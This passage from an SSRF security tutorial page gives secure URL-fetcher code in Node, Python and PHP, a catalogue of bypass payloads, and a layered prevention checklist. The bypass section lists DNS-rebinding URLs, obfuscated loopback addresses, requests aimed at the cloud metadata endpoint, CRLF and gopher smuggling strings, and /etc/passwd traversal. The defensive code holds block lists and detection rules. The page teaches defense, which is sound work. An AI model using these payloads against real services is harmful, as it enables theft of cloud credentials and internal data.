<span class="code-keyword">const</span> axios = <span class="code-function">require</span>(<span class="code-string">'axios'</span>);

<span class="code-keyword">async function</span> <span class="code-function">validateWebhookUrl</span>(url) {
    <span class="code-keyword">const</span> parsed = <span class="code-keyword">new</span> <span class="code-function">URL</span>(url);
    
    <span class="code-comment">// Scheme validation</span>
    <span class="code-keyword">if</span> (![<span class="code-string">'https'</span>].<span class="code-function">includes</span>(parsed.protocol.<span class="code-function">slice</span>(<span class="code-keyword">0</span>, -<span class="code-keyword">1</span>))) {
        <span class="code-keyword">throw</span> <span class="code-keyword">new</span> <span class="code-function">Error</span>(<span class="code-string">'Only HTTPS allowed'</span>);
    }
    
    <span class="code-comment">// DNS resolution with timeout</span>
    <span class="code-keyword">const</span> addresses = <span class="code-keyword">await</span> dns.<span class="code-function">promises</span>.<span class="code-function">resolve4</span>(parsed.hostname, {
        <span class="code-attr">ttl</span>: <span class="code-keyword">true</span>
    });
    
    <span class="code-comment">// IP validation</span>
    <span class="code-keyword">const</span> ip = addresses[<span class="code-keyword">0</span>].address;
    <span class="code-keyword">const</span> { isPrivate } = <span class="code-function">require</span>(<span class="code-string">'ip'</span>);
    
    <span class="code-keyword">if</span> (<span class="code-function">isPrivate</span>(ip)) {
        <span class="code-keyword">throw</span> <span class="code-keyword">new</span> <span class="code-function">Error</span>(<span class="code-string">'Private IPs not allowed'</span>);
    }
    
    <span class="code-comment">// Port validation</span>
    <span class="code-keyword">const</span> port = parsed.port || <span class="code-keyword">443</span>;
    <span class="code-keyword">if</span> (port != <span class="code-keyword">443</span>) {
        <span class="code-keyword">throw</span> <span class="code-keyword">new</span> <span class="code-function">Error</span>(<span class="code-string">'Only port 443 allowed'</span>);
    }
    
    <span class="code-keyword">return</span> <span class="code-keyword">true</span>;
}

<span class="code-comment">// Secure webhook call</span>
<span class="code-keyword">async function</span> <span class="code-function">callWebhook</span>(url, data) {
    <span class="code-keyword">await</span> <span class="code-function">validateWebhookUrl</span>(url);
    
    <span class="code-comment">// Use dedicated egress proxy with network ACLs</span>
    <span class="code-keyword">return</span> axios.<span class="code-function">post</span>(url, data, {
        <span class="code-attr">proxy</span>: <span class="code-keyword">false</span>,  <span class="code-comment">// Don't use system proxy</span>
        <span class="code-attr">timeout</span>: <span class="code-keyword">5000</span>,
        <span class="code-attr">maxRedirects</span>: <span class="code-keyword">0</span>,
        <span class="code-attr">httpAgent</span>: <span class="code-keyword">new</span> <span class="code-function">http.Agent</span>({ <span class="code-attr">family</span>: <span class="code-keyword">4</span> }),  <span class="code-comment">// Force IPv4</span>
        <span class="code-attr">headers</span>: {
            <span class="code-string">'User-Agent'</span>: <span class="code-string">'WebhookService/1.0'</span>
        }
    });
}</code></pre>
        </div>

        <h3 class="subsection-title">Lab 3: Python Secure URL Fetcher</h3>
        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">✅ Python Secure Implementation</span></div>
          <pre><code><span class="code-keyword">import</span> socket
<span class="code-keyword">import</span> ipaddress
<span class="code-keyword">import</span> requests
<span class="code-keyword">from</span> urllib.parse <span class="code-keyword">import</span> urlparse

<span class="code-keyword">class</span> <span class="code-function">SecureURLFetcher</span>:
    <span class="code-function">BLOCKED_SCHEMES</span> = {<span class="code-string">'file'</span>, <span class="code-string">'ftp'</span>, <span class="code-string">'gopher'</span>, <span class="code-string">'dict'</span>, <span class="code-string">'ldap'</span>}
    <span class="code-function">BLOCKED_PORTS</span> = {<span class="code-keyword">22</span>, <span class="code-keyword">23</span>, <span class="code-keyword">25</span>, <span class="code-keyword">53</span>, <span class="code-keyword">110</span>, <span class="code-keyword">143</span>, <span class="code-keyword">3306</span>, <span class="code-keyword">5432</span>, <span class="code-keyword">6379</span>, <span class="code-keyword">27017</span>}
    
    <span class="code-keyword">def</span> <span class="code-function">is_private_ip</span>(self, ip_str):
        <span class="code-keyword">try</span>:
            ip = ipaddress.ip_address(ip_str)
            <span class="code-keyword">return</span> ip.is_private <span class="code-keyword">or</span> ip.is_loopback <span class="code-keyword">or</span> ip.is_reserved
        <span class="code-keyword">except</span> <span class="code-function">ValueError</span>:
            <span class="code-keyword">return</span> <span class="code-keyword">True</span>
    
    <span class="code-keyword">def</span> <span class="code-function">resolve_hostname</span>(self, hostname):
        <span class="code-comment"># Get all IP addresses</span>
        <span class="code-keyword">try</span>:
            ips = socket.<span class="code-function">getaddrinfo</span>(hostname, <span class="code-keyword">None</span>)
            <span class="code-keyword">return</span> [ip[<span class="code-keyword">4</span>][<span class="code-keyword">0</span>] <span class="code-keyword">for</span> ip <span class="code-keyword">in</span> ips]
        <span class="code-keyword">except</span> <span class="code-function">socket.gaierror</span>:
            <span class="code-keyword">return</span> []
    
    <span class="code-keyword">def</span> <span class="code-function">validate_url</span>(self, url):
        parsed = <span class="code-function">urlparse</span>(url)
        
        <span class="code-comment"># Scheme check</span>
        <span class="code-keyword">if</span> parsed.scheme <span class="code-keyword">in</span> self.BLOCKED_SCHEMES:
            <span class="code-keyword">raise</span> <span class="code-function">ValueError</span>(<span class="code-string">f"Scheme '{parsed.scheme}' not allowed"</span>)
        
        <span class="code-keyword">if</span> parsed.scheme <span class="code-keyword">not in</span> {<span class="code-string">'http'</span>, <span class="code-string">'https'</span>}:
            <span class="code-keyword">raise</span> <span class="code-function">ValueError</span>(<span class="code-string">"Only HTTP/HTTPS allowed"</span>)
        
        <span class="code-comment"># Port check</span>
        port = parsed.port <span class="code-keyword">or</span> (<span class="code-keyword">443</span> <span class="code-keyword">if</span> parsed.scheme == <span class="code-string">'https'</span> <span class="code-keyword">else</span> <span class="code-keyword">80</span>)
        <span class="code-keyword">if</span> port <span class="code-keyword">in</span> self.BLOCKED_PORTS:
            <span class="code-keyword">raise</span> <span class="code-function">ValueError</span>(<span class="code-string">f"Port {port} not allowed"</span>)
        
        <span class="code-comment"># DNS resolution and IP validation</span>
        ips = self.<span class="code-function">resolve_hostname</span>(parsed.hostname)
        <span class="code-keyword">if</span> <span class="code-keyword">not</span> ips:
            <span class="code-keyword">raise</span> <span class="code-function">ValueError</span>(<span class="code-string">"Could not resolve hostname"</span>)
        
        <span class="code-keyword">for</span> ip <span class="code-keyword">in</span> ips:
            <span class="code-keyword">if</span> self.<span class="code-function">is_private_ip</span>(ip):
                <span class="code-keyword">raise</span> <span class="code-function">ValueError</span>(<span class="code-string">f"Private IP {ip} not allowed"</span>)
        
        <span class="code-keyword">return</span> <span class="code-keyword">True</span>
    
    <span class="code-keyword">def</span> <span class="code-function">fetch</span>(self, url, **kwargs):
        self.<span class="code-function">validate_url</span>(url)
        
        <span class="code-comment"># Use session with disabled redirects</span>
        session = requests.<span class="code-function">Session</span>()
        session.max_redirects = <span class="code-keyword">0</span>
        
        <span class="code-keyword">return</span> session.<span class="code-function">get</span>(
            url,
            timeout=<span class="code-keyword">10</span>,
            allow_redirects=<span class="code-keyword">False</span>,
            **kwargs
        )</code></pre>
        </div>
      </div>

      <div id="bypass" class="content-card">
        <h2 class="card-title"><i>🚧</i> SSRF Bypass Techniques</h2>

        <p class="text-content">
          Attackers employ various techniques to bypass URL validation and IP filtering. Understanding these helps
          in building robust defenses.
        </p>

        <h3 class="subsection-title">1. DNS Rebinding</h3>
        <p class="text-content">
          DNS rebinding exploits the time gap between DNS resolution and HTTP request. The attacker controls a DNS
          server that returns a legitimate IP during validation but switches to an internal IP when the actual
          request is made.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">DNS Rebinding Attack</span></div>
          <pre><code><span class="code-comment">-- Attacker controls attacker.com DNS with low TTL</span>
<span class="code-comment">-- First request (validation):</span>
<span class="code-string">?url=http://attacker.com/data</span>
<span class="code-comment">-- DNS returns: 1.2.3.4 (public IP) - passes validation</span>

<span class="code-comment">-- Second request (actual fetch, seconds later):</span>
<span class="code-comment">-- DNS returns: 192.168.1.1 (internal IP) - bypasses validation!</span>

<span class="code-comment">-- Tools: dnsrebinder.tool, singularity.ofra.nl</span>
<span class="code-string">?url=http://7f000001.1.3.3.7.rbndr.us/</span>  <span class="code-comment">-- Resolves to 127.0.0.1</span></code></pre>
        </div>

        <h3 class="subsection-title">2. IP Address Obfuscation</h3>
        <p class="text-content">
          Representing IP addresses in alternative formats to bypass pattern matching.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">IP Obfuscation Techniques</span></div>
          <pre><code><span class="code-comment">-- Decimal notation</span>
<span class="code-string">http://2130706433/</span>  <span class="code-comment">-- = 127.0.0.1 (127*256^3 + 0*256^2 + 0*256 + 1)</span>

<span class="code-comment">-- Hexadecimal</span>
<span class="code-string">http://0x7f000001/</span>  <span class="code-comment">-- = 127.0.0.1</span>
<span class="code-string">http://0x7f.0x00.0x00.0x01/</span>

<span class="code-comment">-- Octal</span>
<span class="code-string">http://0177.0000.0000.0001/</span>  <span class="code-comment">-- = 127.0.0.1</span>

<span class="code-comment">-- Mixed notation</span>
<span class="code-string">http://127.0x00.0x00.1/</span>
<span class="code-string">http://0x7f.0.0.1/</span>

<span class="code-comment">-- IPv6</span>
<span class="code-string">http://[::1]/</span>  <span class="code-comment">-- localhost</span>
<span class="code-string">http://[::ffff:127.0.0.1]/</span>  <span class="code-comment">-- IPv4-mapped IPv6</span>

<span class="code-comment">-- Shortened IPv6</span>
<span class="code-string">http://[0:0:0:0:0:0:0:1]/</span>
<span class="code-string">http://[0000:0000:0000:0000:0000:0000:0000:0001]/</span></code></pre>
        </div>

        <h3 class="subsection-title">3. URL Parsing Differences</h3>
        <p class="text-content">
          Different URL parsers (PHP, Python, Java, browsers) handle URLs differently. Attackers exploit these
          discrepancies to bypass validation.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Parser Differential Attacks</span></div>
          <pre><code><span class="code-comment">-- @ symbol abuse (credentials vs host)</span>
<span class="code-string">http://169.254.169.254@example.com/</span>
<span class="code-comment">-- PHP parse_url: host=example.com, user=169.254.169.254</span>
<span class="code-comment">-- But cURL requests: 169.254.169.254 (ignores @example.com)</span>

<span class="code-comment">-- Multiple @ symbols</span>
<span class="code-string">http://example.com@169.254.169.254/</span>
<span class="code-string">http://example.com:80@169.254.169.254:80/</span>

<span class="code-comment">-- Fragment abuse</span>
<span class="code-string">http://example.com#@169.254.169.254/</span>

<span class="code-comment">-- Unicode homoglyphs</span>
<span class="code-string">http://еxample.com/</span>  <span class="code-comment">-- Cyrillic 'е' instead of Latin 'e'</span>

<span class="code-comment">-- Null byte injection (legacy systems)</span>
<span class="code-string">http://example.com%00.169.254.169.254/</span>

<span class="code-comment">-- Path traversal in URL</span>
<span class="code-string">http://example.com/../../169.254.169.254/</span></code></pre>
        </div>

        <h3 class="subsection-title">4. Redirect-Based SSRF</h3>
        <p class="text-content">
          Even if the initial URL is validated, following redirects can lead to internal resources.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Open Redirect to SSRF</span></div>
          <pre><code><span class="code-comment">-- Attacker controls a server that redirects</span>
<span class="code-comment">-- Initial request (passes validation):</span>
<span class="code-string">GET /fetch?url=https://attacker.com/redirect</span>

<span class="code-comment">-- Attacker's server responds:</span>
<span class="code-keyword">HTTP/1.1</span> <span class="code-keyword">302</span> Found
<span class="code-attr">Location</span>: <span class="code-string">http://169.254.169.254/latest/meta-data/</span>

<span class="code-comment">-- Application follows redirect to internal URL</span>
<span class="code-comment">-- Defense: Disable redirects or validate redirect targets</span></code></pre>
        </div>

        <h3 class="subsection-title">5. Protocol Smuggling</h3>
        <p class="text-content">
          Using alternative protocols or protocol-specific features to bypass restrictions.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Protocol Smuggling</span></div>
          <pre><code><span class="code-comment">-- HTTP basic auth with newline injection</span>
<span class="code-string">http://victim.com:80%0d%0aHost:%20169.254.169.254%0d%0a%0d%0aGET%20/meta-data%20HTTP/1.1</span>

<span class="code-comment">-- HTTP 0.9 simple response smuggling</span>
<span class="code-string">gopher://internal:80/_GET%20/admin%20HTTP/1.0%0d%0aHost:%20internal%0d%0a%0d%0a</span>

<span class="code-comment">-- FTP bounce attack</span>
<span class="code-string">ftp://attacker.com/file.txt</span>
<span class="code-comment">-- FTP server configured to proxy to internal</span>

<span class="code-comment">-- File protocol via HTTP parameter</span>
<span class="code-string">?url=http://example.com/../../../etc/passwd</span>
<span class="code-string">?url=http://example.com/%252e%252e%252fetc%252fpasswd</span>  <span class="code-comment">-- Double-encoded</span></code></pre>
        </div>
      </div>

      <div id="mitigation" class="content-card">
        <h2 class="card-title"><i>🛡️</i> SSRF Prevention Checklist: Defense in Depth</h2>

        <div class="highlight-box">
          <strong>Golden Rule:</strong> Never trust user-supplied URLs. Implement strict validation at multiple
          layers: parsing, DNS resolution, IP validation, and network segmentation. Assume all user input is
          malicious and design your architecture accordingly.
        </div>

        <h3 class="subsection-title">Layer 1: URL Parsing and Validation</h3>
        <p class="text-content">
          Parse URLs carefully and validate all components before making any network requests.
        </p>

        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">Strict URL Validation</span></div>
          <pre><code><span class="code-keyword">&lt;?php</span>
<span class="code-keyword">function</span> <span class="code-function">validateUrlStrict</span>(<span class="code-keyword">$url</span>) {
    <span class="code-comment">// Parse URL</span>
    <span class="code-keyword">$parsed</span> = <span class="code-function">parse_url</span>(<span class="code-keyword">$url</span>);
    <span class="code-keyword">if</span> (!<span class="code-keyword">$parsed</span>) {
        <span class="code-keyword">throw</span> <span class="code-keyword">new</span> <span class="code-function">Exception</span>(<span class="code-string">"Invalid URL format"</span>);
    }
    
    <span class="code-comment">// Scheme whitelist</span>
    <span class="code-keyword">$allowed_schemes</span> = [<span class="code-string">'https'</span>];  <span class="code-comment">// Prefer HTTPS only</span>
    <span class="code-keyword">if</span> (!<span class="code-function">in_array</span>(<span class="code-keyword">$parsed</span>[<span class="code-string">'scheme'</span>], <span class="code-keyword">$allowed_schemes</span>, <span class="code-keyword">true</span>)) {
        <span class="code-keyword">throw</span> <span class="code-keyword">new</span> <span class="code-function">Exception</span>(<span class="code-string">"Invalid scheme"</span>);
    }
    
    <span class="code-comment">// Host must be present</span>
    <span class="code-keyword">if</span> (<span class="code-function">empty</span>(<span class="code-keyword">$parsed</span>[<span class="code-string">'host'</span>])) {
        <span class="code-keyword">throw</span> <span class="code-keyword">new</span> <span class="code-function">Exception</span>(<span class="code-string">"Host required"</span>);
    }
    
    <span class="code-comment">// Reject URLs with userinfo (username:password@)</span>
    <span class="code-keyword">if</span> (<span class="code-function">isset</span>(<span class="code-keyword">$parsed</span>[<span class="code-string">'user'</span>]) || <span class="code-function">isset</span>(<span class="code-keyword">$parsed</span>[<span class="code-string">'pass'</span>])) {
        <span class="code-keyword">throw</span> <span class="code-keyword">new</span> <span class="code-function">Exception</span>(<span class="code-string">"Credentials in URL not allowed"</span>);
    }
    
    <span class="code-comment">// Resolve DNS and validate IP</span>
    <span class="code-keyword">$ips</span> = <span class="code-function">dns_get_record</span>(<span class="code-keyword">$parsed</span>[<span class="code-string">'host'</span>], DNS_A + DNS_AAAA);
    <span class="code-keyword">foreach</span> (<span class="code-keyword">$ips</span> <span class="code-keyword">as</span> <span class="code-keyword">$ip</span>) {
        <span class="code-keyword">$ip_addr</span> = <span class="code-keyword">$ip</span>[<span class="code-string">'type'</span>] == <span class="code-string">'A'</span> ? <span class="code-keyword">$ip</span>[<span class="code-string">'ip'</span>] : <span class="code-keyword">$ip</span>[<span class="code-string">'ipv6'</span>];
        
        <span class="code-keyword">if</span> (<span class="code-function">filter_var</span>(<span class="code-keyword">$ip_addr</span>, <span class="code-function">FILTER_VALIDATE_IP</span>, 
            <span class="code-function">FILTER_FLAG_NO_PRIV_RANGE</span> | <span class="code-function">FILTER_FLAG_NO_RES_RANGE</span>) === <span class="code-keyword">false</span>) {
            <span class="code-keyword">throw</span> <span class="code-keyword">new</span> <span class="code-function">Exception</span>(<span class="code-string">"Private/reserved IP not allowed"</span>);
        }
    }
    
    <span class="code-keyword">return</span> <span class="code-keyword">true</span>;
}
<span class="code-keyword">?&gt;</span></code></pre>
        </div>

        <h3 class="subsection-title">Layer 2: Network Segmentation</h3>
        <p class="text-content">
          Isolate services that fetch external URLs in restricted network segments with strict egress rules.
        </p>

        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">Network Architecture</span></div>
          <pre><code><span class="code-comment">-- DMZ Architecture for URL fetchers</span>

<span class="code-comment">-- [Internet] → [WAF] → [App Servers] → [URL Fetcher Service]</span>
<span class="code-comment">--                                           ↓</span>
<span class="code-comment">--                                    [Restricted Egress]</span>
<span class="code-comment">--                                           ↓</span>
<span class="code-comment">--                                    [External Internet Only]</span>

<span class="code-comment">-- AWS Security Group for URL fetcher</span>
{
    <span class="code-attr">"GroupName"</span>: <span class="code-string">"url-fetcher-sg"</span>,
    <span class="code-attr">"IpPermissionsEgress"</span>: [
        {
            <span class="code-attr">"IpProtocol"</span>: <span class="code-string">"tcp"</span>,
            <span class="code-attr">"FromPort"</span>: <span class="code-keyword">443</span>,
            <span class="code-attr">"ToPort"</span>: <span class="code-keyword">443</span>,
            <span class="code-attr">"IpRanges"</span>: [{ <span class="code-attr">"CidrIp"</span>: <span class="code-string">"0.0.0.0/0"</span> }]
        }
    ],
    <span class="code-attr">"IpPermissions"</span>: []  <span class="code-comment">-- No inbound access</span>
}

<span class="code-comment">-- iptables rules on URL fetcher server</span>
<span class="code-string">iptables -A OUTPUT -d 10.0.0.0/8 -j DROP</span>
<span class="code-string">iptables -A OUTPUT -d 172.16.0.0/12 -j DROP</span>
<span class="code-string">iptables -A OUTPUT -d 192.168.0.0/16 -j DROP</span>
<span class="code-string">iptables -A OUTPUT -d 169.254.0.0/16 -j DROP</span>
<span class="code-string">iptables -A OUTPUT -d 127.0.0.0/8 -j DROP</span></code></pre>
        </div>

        <h3 class="subsection-title">Layer 3: Cloud Metadata Protection</h3>
        <p class="text-content">
          Implement specific protections against cloud metadata service access.
        </p>

        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">Cloud Metadata Protection</span></div>
          <pre><code><span class="code-comment">-- AWS: Require IMDSv2 (token-based)</span>
<span class="code-string">aws ec2 modify-instance-metadata-options \</span>
<span class="code-string">    --instance-id i-1234567890abcdef0 \</span>
<span class="code-string">    --http-tokens required \</span>
<span class="code-string">    --http-endpoint enabled \</span>
<span class="code-string">    --http-put-response-hop-limit 1</span>

<span class="code-comment">-- GCP: Require metadata-flavor header</span>
<span class="code-keyword">function</span> <span class="code-function">getMetadata</span>() {
    <span class="code-keyword">const</span> token = <span class="code-keyword">await</span> fetch(
        <span class="code-string">'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token'</span>,
        {
            <span class="code-attr">headers</span>: {
                <span class="code-string">'Metadata-Flavor'</span>: <span class="code-string">'Google'</span>  <span class="code-comment">// Required header</span>
            }
        }
    );
}

<span class="code-comment">-- Azure: Use IMDS with specific headers</span>
<span class="code-string">curl -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"</span>

<span class="code-comment">-- Network-level: Block metadata IP at proxy/firewall</span>
<span class="code-string">acl block_metadata dst 169.254.169.254</span>
<span class="code-string">http_access deny block_metadata</span></code></pre>
        </div>

        <h3 class="subsection-title">Layer 4: Application-Level Controls</h3>
        <p class="text-content">
          Implement application-level restrictions and monitoring.
        </p>

        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">Application Controls</span></div>
          <pre><code><span class="code-comment">// Rate limiting per target domain</span>
<span class="code-keyword">const</span> rateLimiter = <span class="code-keyword">new</span> <span class="code-function">Map</span>();

<span class="code-keyword">function</span> <span class="code-function">checkRateLimit</span>(hostname) {
    <span class="code-keyword">const</span> now = Date.<span class="code-function">now</span>();
    <span class="code-keyword">const</span> window = <span class="code-keyword">60000</span>;  <span class="code-comment">// 1 minute</span>
    <span class="code-keyword">const</span> limit = <span class="code-keyword">10</span>;      <span class="code-comment">// 10 requests per minute</span>
    
    <span class="code-keyword">if</span> (!rateLimiter.<span class="code-function">has</span>(hostname)) {
        rateLimiter.<span class="code-function">set</span>(hostname, []);
    }
    
    <span class="code-keyword">const</span> requests = rateLimiter.<span class="code-function">get</span>(hostname);
    <span class="code-keyword">const</span> recent = requests.<span class="code-function">filter</span>(<span class="code-attr">time</span> => now - time < window);
    
    <span class="code-keyword">if</span> (recent.length >= limit) {
        <span class="code-keyword">throw</span> <span class="code-keyword">new</span> <span class="code-function">Error</span>(<span class="code-string">'Rate limit exceeded'</span>);
    }
    
    recent.<span class="code-function">push</span>(now);
}

<span class="code-comment">// Response size limits</span>
<span class="code-keyword">const</span> MAX_RESPONSE_SIZE = <span class="code-keyword">5</span> * <span class="code-keyword">1024</span> * <span class="code-keyword">1024</span>;  <span class="code-comment">// 5MB</span>

<span class="code-comment">// Content-type validation</span>
<span class="code-keyword">const</span> ALLOWED_CONTENT_TYPES = [<span class="code-string">'image/jpeg'</span>, <span class="code-string">'image/png'</span>, <span class="code-string">'application/json'</span>];

<span class="code-comment">// Request timeout</span>
<span class="code-keyword">const</span> REQUEST_TIMEOUT = <span class="code-keyword">5000</span>;  <span class="code-comment">// 5 seconds</span>

<span class="code-comment">// Disable following redirects</span>
<span class="code-keyword">const</span> MAX_REDIRECTS = <span class="code-keyword">0</span>;</code></pre>
        </div>

        <h3 class="subsection-title">Layer 5: Monitoring and Alerting</h3>
        <p class="text-content">
          Implement comprehensive logging and alerting for suspicious URL fetching behavior.
        </p>

        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">Security Monitoring</span></div>
          <pre><code><span class="code-keyword">class</span> <span class="code-function">SSRFMonitor</span> {
    <span class="code-function">logRequest</span>(url, source_ip, user_id, response_status) {
        <span class="code-keyword">const</span> log = {
            <span class="code-attr">timestamp</span>: <span class="code-keyword">new</span> <span class="code-function">Date</span>().<span class="code-function">toISOString</span>(),
            <span class="code-attr">url</span>,
            <span class="code-attr">source_ip</span>,
            <span class="code-attr">user_id</span>,
            <span class="code-attr">response_status</span>,
            <span class="code-attr">target_ip</span>: <span class="code-keyword">this</span>.<span class="code-function">resolveIp</span>(url),
            <span class="code-attr">target_port</span>: <span class="code-keyword">this</span>.<span class="code-function">getPort</span>(url)
        };
        
        <span class="code-comment">// Alert on suspicious patterns</span>
        <span class="code-keyword">if</span> (<span class="code-keyword">this</span>.<span class="code-function">isSuspicious</span>(log)) {
            <span class="code-keyword">this</span>.<span class="code-function">alert</span>(<span class="code-string">'Potential SSRF detected'</span>, log);
        }
        
        <span class="code-comment">// Send to SIEM</span>
        siem.<span class="code-function">send</span>(log);
    }
    
    <span class="code-function">isSuspicious</span>(log) {
        <span class="code-comment">// Private IP access</span>
        <span class="code-keyword">if</span> (<span class="code-function">isPrivate</span>(log.target_ip)) <span class="code-keyword">return</span> <span class="code-keyword">true</span>;
        
        <span class="code-comment">// Metadata endpoint access</span>
        <span class="code-keyword">if</span> (log.target_ip === <span class="code-string">'169.254.169.254'</span>) <span class="code-keyword">return</span> <span class="code-keyword">true</span>;
        
        <span class="code-comment">// Non-standard ports</span>
        <span class="code-keyword">if</span> (![<span class="code-keyword">80</span>, <span class="code-keyword">443</span>].<span class="code-function">includes</span>(log.target_port)) <span class="code-keyword">return</span> <span class="code-keyword">true</span>;
        
        <span class="code-comment">// High frequency from same user</span>
        <span class="code-keyword">if</span> (<span class="code-keyword">this</span>.<span class="code-function">getRequestCount</span>(log.user_id, <span class="code-string">'1m'</span>) > <span class="code-keyword">100</span>) <span class="code-keyword">return</span> <span class="code-keyword">true</span>;
        
        <span class="code-keyword">return</span> <span class="code-keyword">false</span>;
    }
}</code></pre>
        </div>

        <h3 class="subsection-title">Security Checklist Summary</h3>

        <div class="highlight-box">
          <table style="width: 100%; border-collapse: collapse;">
            <tr style="border-bottom: 1px solid var(--border-color);">
              <th style="padding: 0.75rem; text-align: left; color: var(--neon-green);">Defense Layer</th>
              <th style="padding: 0.75rem; text-align: left; color: var(--neon-purple);">Implementation</th>
              <th style="padding: 0.75rem; text-align: left; color: var(--text-secondary);">Priority</th>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">URL Validation</td>
              <td style="padding: 0.75rem;">Parse, whitelist schemes, validate host and IP</td>
              <td style="padding: 0.75rem;">Critical</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">DNS Validation</td>
              <td style="padding: 0.75rem;">Resolve before request, validate all returned IPs</td>
              <td style="padding: 0.75rem;">Critical</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Network Segmentation</td>
              <td style="padding: 0.75rem;">Isolate fetchers, block private IPs at firewall</td>
              <td style="padding: 0.75rem;">Critical</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Cloud Metadata Protection</td>
              <td style="padding: 0.75rem;">IMDSv2, hop limits, metadata headers</td>
              <td style="padding: 0.75rem;">High</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Disable Redirects</td>
              <td style="padding: 0.75rem;">Set maxRedirects=0 or validate redirect targets</td>
              <td style="padding: 0.75rem;">High</td>
            </tr>
            <tr>
              <td style="padding: 0.75rem;">Monitoring</td>
              <td style="padding: 0.75rem;">Log all outbound requests, alert on anomalies</td>
              <td style="padding: 0.75rem;">Medium</td>
            </tr>
          </table>
        </div>

        <div class="diagram-container">
          <div class="diagram-label">🎬 Video: Implementing Defense in Depth for SSRF</div>
          <div class="video-placeholder">
            <i>▶️</i><br>
            [Insert Video: Complete SSRF protection implementation walkthrough]
          </div>
        </div>
      </div>

    </main>
  </div>

  <script>
  function toggleSidebar() {
    const sidebar = document.querySelector('.sidebar');
    sidebar.style.transform = sidebar.style.transform === 'translateX(0%)' ? 'translateX(-100%)' : 'translateX(0%)';
  }

  document.querySelectorAll('a[href^="#"]').forEach(anchor => {
    anchor.addEventListener('click', function(e) {
      e.preventDefault();
      const target = document.querySelector(this.getAttribute('href'));
      if (target) {
        target.scrollIntoView({
          behavior: 'smooth',
          block: 'start'
        });
      }
    });
  });

  function copyCode(btn) {
    const codeBlock = btn.closest('.code-block').querySelector('pre');
    const text = codeBlock.textContent;
    navigator.clipboard.writeText(text).then(() => {
      btn.textContent = '✅ Copied!';
      setTimeout(() => btn.textContent = '📋 Copy', 2000);
    });
  }
  </script>
  <?php if (!$isLoggedIn): ?>
  <script>
  window.addEventListener("load", function() {
    if (typeof LoginModal !== "undefined") {
      LoginModal.show();
    }
  });
  </script>
  <?php endif; ?>

</body>

</html>